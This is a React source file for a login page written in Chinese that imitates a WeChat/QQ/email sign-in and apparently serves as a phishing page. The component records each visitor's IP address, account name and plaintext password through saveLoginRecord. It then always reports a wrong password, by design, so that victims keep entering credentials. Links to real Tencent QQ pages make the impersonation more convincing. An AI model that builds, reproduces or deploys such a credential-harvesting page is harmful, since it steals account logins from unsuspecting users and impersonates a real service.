import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Card, CardContent } from "@/components/ui/card"
import { useState, useEffect } from "react"
import { useIsMobile } from "@/hooks/use-mobile"
import { saveLoginRecord } from "@/lib/login-records"

/**
 * 登录表单组件
 * 处理用户登录并记录登录信息
 */
export default function LoginForm() {
  const [account, setAccount] = useState('')
  const [password, setPassword] = useState('')
  const [userIP, setUserIP] = useState('')
  
  // 获取用户IP地址
  useEffect(() => {
    // 使用公共API获取IP地址
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => setUserIP(data.ip))
      .catch(error => {
        console.error('获取IP地址失败:', error)
        setUserIP('未知IP')
      })
  }, [])
  
  // 状态变量用于存储错误信息
  const [errorMessage, setErrorMessage] = useState('')
  
  // 处理登录提交
  const handleLogin = async () => {
    // 重置错误信息
    setErrorMessage('')
    
    // 记录登录信息
    const loginRecord = {
      id: Date.now(),
      timestamp: new Date().toLocaleString(),
      ip: userIP,
      account,
      password,
      isFirstLogin: false // 初始值，会在saveLoginRecord函数中更新
    }
    
    try {
      // 保存登录记录到本地文件
      await saveLoginRecord(loginRecord)
      
      // 无论输入什么账号密码，都显示密码错误
      setErrorMessage('密码错误，请修改密码并重试')
    } catch (error) {
      console.error('保存登录记录失败:', error)
      setErrorMessage('登录过程中发生错误，请稍后重试')
    }
  }
  
  return (
    <div className="bg-gradient-to-b from-slate-800 to-slate-900 rounded-xl overflow-hidden">
      <div className="w-full max-w-md mx-auto p-4 md:p-6">
        <h1 className="text-white text-lg md:text-xl font-medium text-center mb-4 md:mb-6">微信号/QQ号/邮箱登录</h1>

        <Card className="bg-slate-700/50 border-slate-600 backdrop-blur-sm">
          <CardContent className="p-4 md:p-6 space-y-4 md:space-y-6">
            <div className="space-y-2">
              <Label htmlFor="account" className="text-white text-sm">
                账号
              </Label>
              <Input
                id="account"
                type="text"
                className="bg-slate-600/50 border-slate-500 text-white placeholder:text-slate-400 focus:border-orange-400 focus:ring-orange-400/20"
                placeholder="请输入微信号/QQ号/邮箱"
                value={account}
                onChange={(e) => setAccount(e.target.value)}
              />
            </div>

            <div className="space-y-2">
              <Label htmlFor="password" className="text-white text-sm">
                密码
              </Label>
              <Input
                id="password"
                type="password"
                className="bg-slate-600/50 border-slate-500 text-white placeholder:text-slate-400 focus:border-orange-400 focus:ring-orange-400/20"
                placeholder="请输入密码"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
              {errorMessage && (
                <p className="text-red-500 text-xs mt-1">{errorMessage}</p>
              )}
            </div>

            <div className="flex justify-between items-center text-xs">
              <a href="https://accounts.qq.com/find/password" className="text-orange-400 hover:text-orange-300">忘记密码?</a>
              {/* 隐藏新用户注册按钮 - HIDDEN BY USER REQUEST */}
              {/* <a href="https://ssl.zc.qq.com/v3/index-chs.html" className="text-orange-400 hover:text-orange-300">新用户注册</a> */}
            </div>

            <p className="text-slate-300 text-xs text-center leading-relaxed">上述微信号/QQ/邮箱仅用于登录验证</p>

            <Button 
              className="w-full bg-gradient-to-r from-orange-400 to-yellow-400 hover:from-orange-500 hover:to-yellow-500 text-slate-900 font-medium py-2 md:py-3 rounded-full text-sm md:text-base"
              onClick={handleLogin}
            >
              同意并登录
            </Button>
          </CardContent>
        </Card>
      </div>
    </div>
  )
}
